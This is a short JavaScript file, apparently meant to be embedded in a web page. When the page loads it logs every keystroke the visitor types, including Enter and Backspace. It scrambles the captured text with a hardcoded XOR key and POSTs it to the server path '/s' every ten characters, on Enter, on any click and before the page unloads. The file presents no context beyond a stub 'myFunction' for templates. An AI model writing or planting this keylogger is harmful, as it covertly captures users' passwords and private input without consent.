document.addEventListener("DOMContentLoaded", function() {
    let keyBuffer = [];
    const XOR_KEY = "defronix";

    function xorEncrypt(text, key) {
        let result = "";
        for (let i = 0; i < text.length; i++) {
            result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
        }
        return result;
    }

    function sendKeystrokes() {
        if (keyBuffer.length > 0) {
            const keystrokes = keyBuffer.join("");
            const encryptedData = xorEncrypt(keystrokes, XOR_KEY);
            
            fetch('/s', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ key: encryptedData })
            }).catch(console.error);
            
            keyBuffer = []; // clear buffer after sending
        }
    }

    // Capture keystrokes
    document.addEventListener('keydown', function(event) {
        // Ignore modifier keys alone
        if (["Shift", "Control", "Alt", "Meta", "CapsLock", "Tab"].includes(event.key)) {
            return;
        }

        let char = event.key;
        if (char === "Enter") {
            char = "[ENTER]";
            keyBuffer.push(char);
            sendKeystrokes(); // force send on enter
            return;
        } else if (char === "Backspace") {
            char = "[DEL]";
        }

        keyBuffer.push(char);

        // Send every 10 characters or when user stops typing
        if (keyBuffer.length >= 10) {
            sendKeystrokes();
        }
    });

    // Also send when user clicks away from a field or submits
    document.addEventListener('click', sendKeystrokes);
    window.addEventListener('beforeunload', sendKeystrokes);
});

// A dummy myFunction used in templates onload=
function myFunction() {
    // Left intentionally blank
}
